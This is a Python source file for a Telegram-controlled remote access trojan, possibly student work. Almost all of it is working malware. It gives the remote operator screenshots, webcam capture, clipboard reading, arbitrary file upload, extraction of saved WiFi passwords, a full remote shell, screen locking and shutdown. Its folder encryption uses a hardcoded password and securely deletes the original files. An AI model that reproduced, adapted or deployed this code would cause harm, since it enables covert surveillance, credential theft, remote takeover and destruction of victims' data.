import os
import re
import mss
import cv2
import time
import pyttsx3
import telebot
import platform
import subprocess
import pyAesCrypt
import glob
import secure_delete
import pyperclip
import xml.etree.ElementTree as ET
from secure_delete import secure_delete

# Replace with your Telegram bot token
TOKEN = 'your_bot_token_here'
bot = telebot.TeleBot(TOKEN)
cd = os.path.expanduser("~")  # Set current directory to user's home directory
secure_delete.secure_random_seed_init()

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'The bot is ready, Lets have some fun...')

@bot.message_handler(commands=['help'])
def help_msg(message):
    help_text = (
        'Available commands:\n'
        '/screen - Capture a screenshot of the desktop\n'
        '/webcam - Capture a webcam image\n'
        '/sys - Get system information\n'
        '/ip - Get public IP address\n'
        '/cd [folder] - Change directory\n'
        '/ls - List directory contents\n'
        '/upload [path] - Upload a file\n'
        '/crypt [path] - Encrypt files in a folder\n'
        '/decrypt [path] - Decrypt files in a folder\n'
        '/lock - Lock the screen\n'
        '/clipboard - Read clipboard contents\n'
        '/shell - Enter remote shell mode (type "exit" to leave)\n'
        '/wifi - Retrieve WiFi passwords\n'
        '/speech [text] - Convert text to speech'
    )
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['screen'])
def send_screen(message):
    try:
        # Use /tmp for temporary files on macOS, current directory on Windows
        image_path = os.path.join("/tmp" if platform.system() == "Darwin" else ".", "capture.png")
        with mss.mss() as sct:
            # Capture a specific region (exclude menu bar and dock on macOS)
            monitor = sct.monitors[1]  # Primary monitor
            region = {
                "top": 25 if platform.system() == "Darwin" else 0,  # Skip menu bar on macOS
                "left": 0,
                "width": monitor["width"],
                "height": monitor["height"] - (105 if platform.system() == "Darwin" else 0)  # Skip dock on macOS
            }
            screenshot = sct.grab(region)
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=image_path)
        
        with open(image_path, "rb") as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(image_path)  # Clean up
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['webcam'])
def capture_webcam_image(message):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            bot.send_message(message.chat.id, "Error: Unable to open the webcam.")
            cap.release()
            return

        # Set camera properties for better brightness
        cap.set(cv2.CAP_PROP_BRIGHTNESS, 100)  # Range: 0-100
        cap.set(cv2.CAP_PROP_EXPOSURE, -4)     # Range: -7 to -1 (adjust as needed)
        cap.set(cv2.CAP_PROP_GAIN, 0)          # Range: 0 to max (camera-dependent)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)

        # Capture frames to stabilize exposure
        for _ in range(10):
            ret, frame = cap.read()
            if not ret:
                bot.send_message(message.chat.id, "Error while capturing the image.")
                cap.release()
                return
            time.sleep(0.1)

        # Capture final frame
        ret, frame = cap.read()
        if ret:
            image_path = os.path.join("/tmp" if platform.system() == "Darwin" else ".", "webcam.jpg")
            cv2.imwrite(image_path, frame)
            with open(image_path, 'rb') as photo_file:
                bot.send_photo(message.chat.id, photo=photo_file)
            os.remove(image_path)
        else:
            bot.send_message(message.chat.id, "Error while capturing the image.")

        cap.release()
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
        if cap.isOpened():
            cap.release()

@bot.message_handler(commands=['ip'])
def send_ip_info(message):
    try:
        command_ip = "curl -s ifconfig.me" if platform.system() == "Darwin" else "curl ipinfo.io/ip"
        result = subprocess.check_output(command_ip, shell=True)
        public_ip = result.decode("utf-8").strip()
        bot.send_message(message.chat.id, public_ip)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['sys'])
def send_system_info(message):
    try:
        system_info = {
            'Platform': platform.platform(),
            'System': platform.system(),
            'Node Name': platform.node(),
            'Release': platform.release(),
            'Version': platform.version(),
            'Machine': platform.machine(),
            'Processor': platform.processor(),
            'CPU Cores': os.cpu_count(),
            'Username': os.getlogin(),
        }
        system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
        bot.send_message(message.chat.id, system_info_text)
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['ls'])
def list_directory(message):
    try:
        contents = os.listdir(cd)
        if not contents:
            bot.send_message(message.chat.id, "Folder is empty.")
        else:
            response = "Directory content:\n" + "\n".join(f"- {item}" for item in contents)
            bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['cd'])
def change_directory(message):
    try:
        global cd
        args = message.text.split(' ', 1)
        if len(args) >= 2:
            new_directory = args[1]
            new_path = os.path.join(cd, new_directory)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                cd = new_path
                bot.send_message(message.chat.id, f"You are in: {cd}")
            else:
                bot.send_message(message.chat.id, f"The directory does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage: USE /cd [folder name]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    try:
        command_parts = message.text.split(' ', 1)
        if len(command_parts) >= 2:
            file_path = command_parts[1]
            if os.path.exists(file_path):
                with open(file_path, 'rb') as file:
                    bot.send_document(message.chat.id, file)
                bot.send_message(message.chat.id, f"File has been transferred successfully.")
            else:
                bot.send_message(message.chat.id, "The specified path does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /upload [PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['crypt'])
def encrypt_folder(message):
    try:
        if len(message.text.split()) >= 2:
            folder_to_encrypt = message.text.split()[1]
            password = "softwarica"
            if not os.path.isdir(folder_to_encrypt):
                bot.send_message(message.chat.id, "Error: The specified folder does not exist.")
                return
            for root, _, files in os.walk(folder_to_encrypt):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_file_path = file_path + '.crypt'
                    try:
                        pyAesCrypt.encryptFile(file_path, encrypted_file_path, password)
                        bot.send_message(message.chat.id, f"File encrypted: {file_path}")
                        if not file_path.endswith('.crypt'):
                            secure_delete.secure_delete(file_path)
                            bot.send_message(message.chat.id, f"Original file securely deleted: {file_path}")
                    except Exception as encrypt_error:
                        bot.send_message(message.chat.id, f"Error encrypting file {file_path}: {str(encrypt_error)}")
            bot.send_message(message.chat.id, "Folder encrypted, and original non-encrypted files securely deleted successfully.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /crypt [FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['decrypt'])
def decrypt_folder(message):
    try:
        if len(message.text.split()) >= 2:
            folder_to_decrypt = message.text.split()[1]
            password = "softwarica"
            for root, _, files in os.walk(folder_to_decrypt):
                for file in files:
                    if file.endswith('.crypt'):
                        file_path = os.path.join(root, file)
                        decrypted_file_path = file_path[:-6]
                        try:
                            pyAesCrypt.decryptFile(file_path, decrypted_file_path, password)
                            secure_delete.secure_delete(file_path)
                            bot.send_message(message.chat.id, f"File decrypted: {decrypted_file_path}")
                        except Exception as decrypt_error:
                            bot.send_message(message.chat.id, f"Error decrypting file {file_path}: {str(decrypt_error)}")
            bot.send_message(message.chat.id, "Folder decrypted, and encrypted files deleted successfully.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /decrypt [ENCRYPTED_FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['lock'])
def lock_command(message):
    try:
        if platform.system() == "Darwin":  # macOS
            result = subprocess.run(["pmset", "displaysleepnow"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        else:  # Windows
            result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            bot.send_message(message.chat.id, "Session successfully locked.")
        else:
            bot.send_message(message.chat.id, f"Failed to lock session: {result.stderr}")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    try:
        if platform.system() == "Darwin":  # macOS
            bot.send_message(message.chat.id, "Shutdown not supported without sudo.")
        else:  # Windows
            result = subprocess.run(["shutdown", "/s", "/t", "5"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                bot.send_message(message.chat.id, "System shutting down.")
            else:
                bot.send_message(message.chat.id, f"Failed to shutdown: {result.stderr}")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['speech'])
def text_to_speech_command(message):
    try:
        text = message.text.replace('/speech', '').strip()
        if text:
            pyttsx3.speak(text)
            bot.send_message(message.chat.id, "Text spoken successfully.")
        else:
            bot.send_message(message.chat.id, "Usage: /speech [TEXT]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['clipboard'])
def clipboard_command(message):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            bot.send_message(message.chat.id, f"Clipboard content:\n{clipboard_text}")
        else:
            bot.send_message(message.chat.id, "Clipboard is empty.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

user_states = {}
STATE_NORMAL = 1
STATE_SHELL = 2

@bot.message_handler(commands=['shell'])
def start_shell(message):
    user_id = message.from_user.id
    user_states[user_id] = STATE_SHELL
    bot.send_message(user_id, "You are now in the remote shell interface. Type 'exit' to exit.")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, STATE_NORMAL) == STATE_SHELL)
def handle_shell_commands(message):
    user_id = message.from_user.id
    command = message.text.strip()
    if command.lower() == 'exit':
        bot.send_message(user_id, "Exiting remote shell interface.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            if stdout:
                send_long_message(user_id, f"Command output:\n{stdout}")
            if stderr:
                send_long_message(user_id, f"Command error output:\n{stderr}")
        except Exception as e:
            bot.send_message(user_id, f"An error occurred: {str(e)}")

def send_long_message(user_id, message_text):
    part_size = 4000
    for i in range(0, len(message_text), part_size):
        bot.send_message(user_id, message_text[i:i+part_size])

@bot.message_handler(commands=['wifi'])
def get_wifi_passwords(message):
    try:
        if platform.system() == "Darwin":  # macOS
            result = subprocess.run(["security", "find-generic-password", "-ga", "AirPort"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                bot.send_message(message.chat.id, f"WiFi passwords:\n{result.stdout}")
            else:
                bot.send_message(message.chat.id, f"Failed to retrieve WiFi passwords: {result.stderr}")
        else:  # Windows
            subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)
            xml_files = glob.glob('*.xml')
            found_passwords = False
            for file_path in xml_files:
                with open(file_path, 'r') as file:
                    xml_content = file.read()
                    ssid_match = re.search(r'<name>(.*?)</name>', xml_content)
                    password_match = re.search(r'<keyMaterial>(.*?)</keyMaterial>', xml_content)
                    if ssid_match and password_match:
                        found_passwords = True
                        ssid = ssid_match.group(1)
                        password = password_match.group(1)
                        bot.send_message(message.chat.id, f"SSID: {ssid}\nPASS: {password}")
                try:
                    os.remove(file_path)
                except Exception as e:
                    bot.send_message(message.chat.id, f"Failed to remove file {file_path}: {str(e)}")
            if not found_passwords:
                bot.send_message(message.chat.id, "No WiFi passwords found.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

if __name__ == "__main__":
    print('Waiting for commands...')
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"Polling error: {str(e)}")
            time.sleep(10)
